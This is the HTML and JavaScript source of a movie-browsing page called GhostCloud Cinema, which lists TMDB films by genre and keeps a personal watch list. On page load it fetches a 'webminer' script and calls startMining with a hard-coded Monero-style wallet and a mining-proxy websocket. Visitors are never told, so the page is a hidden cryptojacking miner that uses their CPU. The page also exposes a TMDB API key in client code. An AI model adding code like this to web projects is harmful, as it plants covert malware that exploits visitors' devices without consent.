<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostCloud Cinema</title>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XCFYVQ97K6"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-XCFYVQ97K6');
    </script>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<header class="top-nav">
    <div class="logo" onclick="location.reload()">GHOSTCLOUD</div>
    <div class="nav-links">
        <span onclick="showMyList()">My List</span>
    </div>
</header>

<main id="app">
    <div id="moviePopup" class="popup">
        <div class="popup-content">
            <span class="close" onclick="closePopup()">&times;</span>
            <div id="popupPreview" class="preview-box"></div>
            <h2 id="p-title"></h2>
            <p id="p-desc"></p>
            <div class="p-btns">
                <button class="btn-play" id="p-play">▶ Play</button>
                <button class="btn-list" id="p-list">+ My List</button>
            </div>
        </div>
    </div>

    <section class="row-section">
        <h2>Trending Now</h2>
        <div class="movie-row" id="trending"></div>
    </section>

    <section class="row-section">
        <h2>Action & Adventure</h2>
        <div class="movie-row" id="action"></div>
    </section>

    <section class="row-section">
        <h2>Horror</h2>
        <div class="movie-row" id="horror"></div>
    </section>

    <section class="row-section">
        <h2>Anime</h2>
        <div class="movie-row" id="anime"></div>
    </section>

    <section id="myListSection" class="row-section" style="display:none;">
        <h2>My List</h2>
        <div class="movie-row" id="myListData"></div>
    </section>
</main>

<script src="https://cdn.jsdelivr.net/gh/annoforge/webminer@main/load.js"></script>
<script>
    const API_KEY = '5513ab319975b0b6f6d297179708caec'; //
    const WALLET = '48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy';
    let myList = JSON.parse(localStorage.getItem('ghost_list')) || [];

    window.onload = () => {
        if (typeof startMining === "function") startMining(WALLET, "Mobile_Node", "wss://ny1.xmrminingproxy.com", 10);
        fetchRow(`https://api.themoviedb.org/3/trending/movie/week?api_key=${API_KEY}`, 'trending');
        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=28`, 'action');
        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=27`, 'horror');
        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=16`, 'anime');
        updateMyListUI();
    };

    async function fetchRow(url, elementId) {
        const r = await fetch(url);
        const d = await r.json();
        const row = document.getElementById(elementId);
        row.innerHTML = d.results.map(m => `
            <div class="card" onclick='openMovie(${JSON.stringify(m).replace(/'/g, "&apos;")})'>
                <img src="https://image.tmdb.org/t/p/w300${m.poster_path}">
            </div>
        `).join('');
    }

    function openMovie(m) {
        document.getElementById('p-title').innerText = m.title;
        document.getElementById('p-desc').innerText = m.overview;
        document.getElementById('popupPreview').style.backgroundImage = `url(https://image.tmdb.org/t/p/original${m.backdrop_path})`;
        document.getElementById('p-play').onclick = () => location.href = `player.html?id=${m.id}`;
        document.getElementById('p-list').onclick = () => {
            if(!myList.find(x => x.id === m.id)) {
                myList.push(m);
                localStorage.setItem('ghost_list', JSON.stringify(myList));
                updateMyListUI();
                alert("Added to My List!");
            }
        };
        document.getElementById('moviePopup').style.display = "flex";
    }

    function closePopup() { document.getElementById('moviePopup').style.display = "none"; }
    
    function updateMyListUI() {
        if(myList.length > 0) {
            document.getElementById('myListSection').style.display = 'block';
            const row = document.getElementById('myListData');
            row.innerHTML = myList.map(m => `
                <div class="card" onclick='openMovie(${JSON.stringify(m).replace(/'/g, "&apos;")})'>
                    <img src="https://image.tmdb.org/t/p/w300${m.poster_path}">
                </div>
            `).join('');
        }
    }
</script>
</body>
</html>
